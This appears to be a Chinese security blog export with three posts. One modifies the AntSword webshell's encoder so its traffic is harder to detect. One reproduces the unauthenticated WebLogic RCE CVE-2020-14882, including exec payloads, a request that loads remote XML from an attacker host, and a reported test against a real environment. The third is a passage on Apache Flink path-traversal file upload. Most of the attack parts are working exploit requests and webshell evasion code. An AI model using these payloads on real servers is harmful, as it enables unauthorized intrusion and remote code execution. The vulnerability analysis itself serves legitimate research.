<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2020/11/09 11:26:29</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  <span class="comment">// 以下代码为 PHP Base64 样例</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成一个随机变量名</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 原有的 payload 在 data[&#x27;_&#x27;]中</span></span><br><span class="line">  <span class="comment">// 取出来之后，转为 base64 编码并放入 randomID key 下</span></span><br><span class="line">  <span class="comment">// data[randomID] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span></span><br><span class="line">  <span class="comment">// data[pwd] = `eval(base64_decode($_POST[$&#123;randomID&#125;]));`;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 自定义</span></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/posts/b371c6dd/image-20201109134752806.png" alt="image-20201109134752806"></p>
<h3 id="01解码器"><a href="#01解码器" class="headerlink" title="01解码器"></a>01解码器</h3><p>其核心是asoutput和decode_buff</p>
<p>这两个模块是输入后时候的编码方式，以及设置可扩展操作<code>ext=&#123;&#125;</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64解码器</span></span><br><span class="line"><span class="comment"> * Create at: 2020/11/09 13:53:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc 将返回数据base64编码</span></span><br><span class="line"><span class="comment">   * 自定义输出函数名称必须为 asenc</span></span><br><span class="line"><span class="comment">   * 该函数使用的语法需要和shell保持一致</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  asoutput: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">      return @base64_encode($out);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 解码 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data 要被解码的 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>解码后的 Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  decode_buff: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.from(data.toString(), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过以上设置，即可初步完成蚁剑的特征修改。</p>
<h2 id="流量中的其他特征"><a href="#流量中的其他特征" class="headerlink" title="流量中的其他特征"></a>流量中的其他特征</h2><p>蚁剑中唯一不变的部分base64内容为：</p>
<p>在客户端组合完整代码时，默认内容均为特征。。。也即是蚁剑中写死的部分。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&#x27;_&#x27;</span>] = <span class="string">`@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);<span class="subst">$&#123;asencCode&#125;</span>;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;<span class="subst">$&#123;tag_s&#125;</span>&quot;;echo @asenc($output);echo &quot;<span class="subst">$&#123;tag_e&#125;</span>&quot;;&#125;ob_start();try&#123;<span class="subst">$&#123;tmpCode&#125;</span>;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();`</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>开始</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params">$out</span>)</span>&#123;<span class="keyword">return</span> @base64_encode($out);&#125;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;$output=ob_get_contents();ob_end_clean();echo I</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编码后如下</span></span><br><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuIEBiYXNlNjRfZW5jb2RlKCRvdXQpO307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gI</span><br></pre></td></tr></table></figure>

<ul>
<li>结束</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;&#125;catch(Exception $e)&#123;echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br><span class="line"></span><br><span class="line">O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D</span><br></pre></td></tr></table></figure>



<p>该版本蚁剑，PHP7连接数据库有问题。错误500，未深究。数据库连接语句为明文。</p>
<p><img src="/posts/b371c6dd/image-20201109152316263.png" alt="image-20201109152316263"></p>
<p>蚁剑中的黑名单</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get</span> <span class="title">urlblacklist</span>() &#123;</span><br><span class="line">  <span class="comment">// return /(gov.cn|edu.cn)/</span></span><br><span class="line">  <span class="keyword">return</span> <span class="regexp">/(gogogo.cn|cccccc.cn)/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-14882 Weblogic未授权RCE</title>
    <url>/posts/9d76ce8e/</url>
    <content><![CDATA[<p>CVE-2020-14882 weblogic 未授权命令执行复现及补丁绕过 </p>
<a id="more"></a>

<h1 id="CVE-2020-14882-weblogic-未授权RCE复现"><a href="#CVE-2020-14882-weblogic-未授权RCE复现" class="headerlink" title="CVE-2020-14882 weblogic 未授权RCE复现"></a>CVE-2020-14882 weblogic 未授权RCE复现</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。</p>
<p>根据补丁diff结果我们可以看出，可以看出上面的变化</p>
<p><img src="/posts/9d76ce8e/img20201028190943.png" alt="img"></p>
<p>我们可以通过下面的代码，任意加载某个类或者对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;&lt;target&gt;&#x2F;console&#x2F;console.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;java.lang.String(&quot;ahihi&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/9d76ce8e/img20201028191206.png" alt="img"></p>
<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>非法字符绕过登陆保护</p>
<p><img src="/posts/9d76ce8e/img20201028191328.png" alt="img"></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>首先通过非法字符绕过访问，然后通过Gadget调用命令执行，poc如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;console&#x2F;images&#x2F;%252E%252E%252Fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22); HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.3.189:7001</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ADM</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p><img src="/posts/9d76ce8e/img20201028191447.png" alt="img"></p>
<h1 id="cve-2020-14882-weblogic-补丁绕过登录分析"><a href="#cve-2020-14882-weblogic-补丁绕过登录分析" class="headerlink" title="cve-2020-14882 weblogic 补丁绕过登录分析"></a>cve-2020-14882 weblogic 补丁绕过登录分析</h1><p>在这里我的weblogic版本为12.2.1.4，其他版本都大同小异。下面我们看一下补丁diff结果</p>
<p><img src="/posts/9d76ce8e/img20201029135449.png" alt="img"></p>
<p>因为这个类是weblogic从http访问的处理类，直接禁止url是否包含危险字符，如果包含，则直接退出。修复方案简单粗暴，不得不佩服。危险字符主要有以下几个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static final String[] IllegalUrl &#x3D; new String[]&#123;&quot;;&quot;, &quot;%252E%252E&quot;, &quot;%2E%2E&quot;, </span><br><span class="line">&quot;..&quot;, &quot;%3C&quot;, &quot;%3E&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="weblogic-管理控制台权限控制分析"><a href="#weblogic-管理控制台权限控制分析" class="headerlink" title="weblogic 管理控制台权限控制分析"></a>weblogic 管理控制台权限控制分析</h2><p>要分析这个洞，首先我们需要了解一下，登录weblogic管理控制台的权限控制</p>
<p>在处理url的<code>weblogic.servlet.internal.WebAppServletContext#doSecuredExecute方法</code>中，调用如下的代码去判断权限等一切有关于安全的内容。代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (context.getSecurityManager().checkAccess(req, rsp, applyAuthFilters, <span class="keyword">false</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> count = ((SessionSecurityData)s).getConcurrentRequestCount();</span><br><span class="line">        <span class="keyword">if</span> (maxConcurrentRequestsAllowed != -<span class="number">1</span> &amp;&amp; count &gt; maxConcurrentRequestsAllowed) &#123;</span><br><span class="line">            context.logError(<span class="string">&quot;Rejecting request since concurrent requests allowable limit exceeded :&quot;</span> + maxConcurrentRequestsAllowed);</span><br><span class="line">            rsp.sendError(<span class="number">500</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>weblogic.servlet.security.internal.WebAppSecurity#checkAccess(HttpServletRequest, HttpServletResponse, boolean, boolean, boolean)</code>中，判断是否所有url都需要权限。当然，访问静态资源肯定是不需要登陆的，可能是为了浏览器兼容性考虑，因为大部分浏览器在登陆后，对访问静态资源都会添加cookie头，只有个别浏览器不会。</p>
<p>所以weblogic将会根据访问的url，也就是是否为静态资源，去返回一个<code>ResourceConstraint</code>对象。该对象描述了该url访问的资源的详细权限信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">            ResourceConstraint resourceConstraint = checkAllResources ? Holder.ALL_CONSTRAINT : <span class="keyword">this</span>.getConstraint(request);</span><br><span class="line"></span><br><span class="line">authorized = <span class="keyword">this</span>.delegateModule.isAuthorized(request, response, resourceConstraint, </span><br><span class="line">applyAuthFilters)</span><br></pre></td></tr></table></figure>

<p>然后调用<code>weblogic.servlet.security.internal.SecurityModule#isAuthorized</code>方法，在该方法中获取用户session，调用<code>weblogic.servlet.security.internal.ChainedSecurityModule#checkAccess</code>方法做进一步权限校验。</p>
<p>最后会在weblogic.servlet.security.internal.CertSecurityModule#checkUserPerm中调用weblogic.servlet.security.internal.WebAppSecurity#hasPermission方法，根据最开始生成的<code>ResourceConstraint</code>对象，判断该次http请求是否有权限。如图所示</p>
<p><img src="/posts/9d76ce8e/img20201029141105.png" alt="img"></p>
<p>如果用户访问的是静态资源，则返回unrestricted的值，hasPermission返回为true，weblogic认为你有权限访问，于是就会放行。如果你访问非静态权限，则直接拦截你的请求，重定向至登陆页。</p>
<p>于是绕过登录的关键在于，怎么访问正常的资源，但是weblogic返回的是静态资源的<code>ResourceConstraint</code>对象</p>
<h2 id="权限绕过分析"><a href="#权限绕过分析" class="headerlink" title="权限绕过分析"></a>权限绕过分析</h2><p>我们回到最开始的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ResourceConstraint resourceConstraint &#x3D; checkAllResources ? Holder.ALL_CONSTRAINT : this.getConstraint(request)</span><br></pre></td></tr></table></figure>

<p>跟入<code>weblogic.servlet.security.internal.WebAppSecurityWLS#getConstraint(java.lang.String, java.lang.String)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ResourceConstraint rcForAllMethods = consForAllMethods == <span class="keyword">null</span> ? <span class="keyword">null</span> : </span><br><span class="line">(ResourceConstraint)consForAllMethods.get(relURI);</span><br></pre></td></tr></table></figure>

<p>在这里会调用<code>weblogic.servlet.utils.StandardURLMapping#get</code>去根据url，返回对应的<code>ResourceConstraint</code>对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    path = path.length() == <span class="number">0</span> ? <span class="string">&quot;/&quot;</span> : <span class="keyword">this</span>.cased(path);</span><br><span class="line">    Object value = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> ((value = <span class="keyword">this</span>.getExactOrPathMatch(path)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (value = <span class="keyword">this</span>.getExtensionMatch(path)) != <span class="keyword">null</span> ? value : <span class="keyword">this</span>.getDefault();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先调用<code>getExactOrPathMatch</code>方法，也就是根据url，匹配是否在静态资源列表中，</p>
<p><img src="/posts/9d76ce8e/img20201029142145.png" alt="img"></p>
<p>而 <code>%252E%252E%252F</code> 恰好是../的url二次编码结果。这样既可以返回静态资源的<code>ResourceConstraint</code>对象，又不会影响正常访问。</p>
<h2 id="weblogic-二次编码原因"><a href="#weblogic-二次编码原因" class="headerlink" title="weblogic 二次编码原因"></a>weblogic 二次编码原因</h2><p>在poc中我们可以看到，<code>../</code>被二次编码了。下面我们来分析一下weblogic能解开的原因</p>
<p>根据http规定，url部分，需要url编码后发送给服务器。服务器正常解开并继续处理。这是第一层url编码</p>
<p>第二层编码的处理，在<code>com.bea.netuix.servlets.manager.UIServletInternal#getTree</code>中，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> UIControl <span class="title">getTree</span><span class="params">(String requestPattern, UIContext ctxt, <span class="keyword">boolean</span> setContentType, ResolvedLocale resolvedLocale)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    HttpServletRequest request = ctxt.getServletRequest();</span><br><span class="line">    HttpServletResponse response = ctxt.getServletResponse();</span><br><span class="line">    requestPattern = URLDecoder.decode(requestPattern, containerServices.getWebappServices().getServerDefaultEncoding());</span><br></pre></td></tr></table></figure>

<p>其中<code>URLDecoder.decode</code>会对第一次编码后的url做第二次解码的工作，当然，如果url还存在url编码的话。</p>
<p>这也就是为什么两次编码可以绕过的原因。</p>
<p>一次url编码为什么不可以绕过？因为经过服务器一次解码后，在<code>weblogic.servlet.utils.StandardURLMapping#get</code>处，无法匹配到静态资源。会被还原成原本的url，所以无法绕过。。大家有机会可以看一下<code>weblogic.utils.collections.MatchMap#match</code>关于查找的代码</p>
<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><h3 id="weblogic-12"><a href="#weblogic-12" class="headerlink" title="weblogic 12"></a>weblogic 12</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%2e%2e%2fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);</span><br></pre></td></tr></table></figure>

<p>因为<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>这个gadget，只存在于weblogic 12，weblogic10 并没有这个gadget（没有包），所以无法使用</p>
<h3 id="weblogic-10"><a href="#weblogic-10" class="headerlink" title="weblogic 10"></a>weblogic 10</h3><p>因为weblogic 10没有相关gadget所以会报错</p>
<p>需要使用<code> com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code></p>
<p>poc如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%2e%2e%2fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:&#x2F;&#x2F;192.168.184.1:8000&#x2F;spel.xml&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="2021-1-28真实环境测试"><a href="#2021-1-28真实环境测试" class="headerlink" title="2021-1-28真实环境测试"></a>2021-1-28真实环境测试</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://10.10.12.189:8000/pom.xml&quot;) HTTP/1.1</span><br><span class="line">Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*</span><br><span class="line">Accept-Language: en-US,en;q=<span class="number">0.8</span>,zh-Hans-CN;q=<span class="number">0.5</span>,zh-Hans;q=<span class="number">0.2</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">7.0</span>; Windows NT <span class="number">10.0</span>; WOW64; Trident/<span class="number">7.0</span>; .NET4<span class="number">.0</span>C; .NET4<span class="number">.0</span>E; Tablet PC <span class="number">2.0</span>; .NET CLR <span class="number">2.0</span><span class="number">.50727</span>; .NET CLR <span class="number">3.0</span><span class="number">.30729</span>; .NET CLR <span class="number">3.5</span><span class="number">.30729</span>)</span><br><span class="line">Host: x x x</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: UM_distinctid=<span class="number">17742</span>b293af3b5<span class="number">-0</span>f356b47557976<span class="number">-43494</span>a0a<span class="number">-187548</span><span class="number">-17742</span>b293b14ec; JSESSIONID=B-FC225Ixflyyd9AQbDdqx8YqLnNO6QjinDdQSY6ECP--DFMJab3!<span class="number">-496998100</span>; ADMINCONSOLESESSION=SUFHvSOu6N4F9qSjaR0xIFbCkT4acNJbKBGi31-yX2M4Z5ofW60I!<span class="number">-496998100</span></span><br></pre></td></tr></table></figure>



<p><img src="/posts/9d76ce8e/image-20210128163416212.png" alt="image-20210128163416212"></p>
<p>原文地址：</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy9wLzEzODk1MTIwLmh0bWw=">https://www.cnblogs.com/potatsoSec/p/13895120.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy9wLzEzODk2NzcxLmh0bWw=">https://www.cnblogs.com/potatsoSec/p/13896771.html<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Flink 任意文件写入/读取</title>
    <url>/posts/87dcd60b/</url>
    <content><![CDATA[<p>Flink核心是一个流式的数据流执行引擎，其针对数据流的分布式计算提供了数据分布、数据通信以及容错机制等功能。Flink 1.5.1引入了REST API，但其实现上存在多处缺陷，导致目录遍历和任意文件写入漏洞，风险较大。</p>
<a id="more"></a>

<h1 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h1><ul>
<li>CVE-2020-17519：攻击者可通过REST API使用…/跳目录实现系统任意文件读取；</li>
<li>CVE-2020-17518：通过构造恶意的http header，可实现远程文件写入。</li>
</ul>
<h1 id="CVE-2020-17518-Apache-Flink任意文件写入"><a href="#CVE-2020-17518-Apache-Flink任意文件写入" class="headerlink" title="CVE-2020-17518(Apache Flink任意文件写入)"></a>CVE-2020-17518(Apache Flink任意文件写入)</h1><p>参考：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJNE16Y3dOVEF6T1E9PSZhbXA7bWlkPTIyNDc0ODk1ODEmYW1wO2lkeD0xJmFtcDtzbj0xMmM5Nzk3YTNjM2U0MjNiYTI4MjdkZDdhYWUyNTBiZCZhbXA7Y2hrc209ZWI4N2YzOGRkY2YwN2E5YjZkYjNiODcxMDU5NjExNmExMjRmNzBiN2QwZTFjOTZkYjVkMGE2ZTk4ZWYyNmM3N2QyYWM1ZWQxMzMzNyZhbXA7c2NlbmU9MCZhbXA7eHRyYWNrPTEjcmQ=">https://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&amp;mid=2247489581&amp;idx=1&amp;sn=12c9797a3c3e423ba2827dd7aae250bd&amp;chksm=eb87f38ddcf07a9b6db3b8710596116a124f70b7d0e1c96db5d0a6e98ef26c77d2ac5ed13337&amp;scene=0&amp;xtrack=1#rd<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>1.5.1-1.11.2</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>首先就考虑上传jsp一句话到Web目录，但是Web目录下并不能够解析jsp脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /jars/upload HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------277556350534634793532534114427</span><br><span class="line">Content-Length: 315</span><br><span class="line">Origin: http://localhost:8081</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost:8081/</span><br><span class="line">Cookie: Idea-ebfc5b99=abcb5f88-d377-4462-9749-1fb24350d578</span><br><span class="line"></span><br><span class="line">-----------------------------277556350534634793532534114427</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;jarfile&quot;</span>; filename=<span class="string">&quot;../../../../../../../tmp/name.txt&quot;</span></span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">liuwei</span><br><span class="line">wangjing</span><br><span class="line">wangyan</span><br><span class="line">wangfei</span><br><span class="line">zhangling</span><br><span class="line">liting</span><br><span class="line">chenjianhua</span><br><span class="line">xujing</span><br><span class="line">-----------------------------277556350534634793532534114427--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/87dcd60b/image-20210108164027108.png" alt="image-20210108164027108"></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h4 id="获取路径"><a href="#获取路径" class="headerlink" title="获取路径"></a>获取路径</h4><p>Flink运行时文件都在/tmp目录下，路径类似于<code>/tmp/flink-web-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/</code></p>
<p>每台服务器运行Flink时路径都不同，因此要先获取该路径。通过接口 /jobmanager/config 则可以获取web.tmpdir的路径。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /jobmanager/config HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost:8081/</span><br><span class="line">Cookie: Idea-ebfc5b99=abcb5f88-d377-4462-9749-1fb24350d578</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">content-length: 545</span><br><span class="line"></span><br><span class="line">[&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;blob.server.port&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;6124&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;taskmanager.memory.process.size&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;1728m&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;parallelism.default&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;jobmanager.execution.failover-strategy&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;region&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;jobmanager.rpc.address&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;b8bcd8765a65&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;taskmanager.numberOfTaskSlots&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;jobmanager.memory.process.size&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;1600m&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;web.tmpdir&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;/tmp/flink-web-5a1a5e27-aa74-4900-9f1c-ad5af08f3d37&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;jobmanager.rpc.port&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;6123&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;query.server.port&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;6125&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

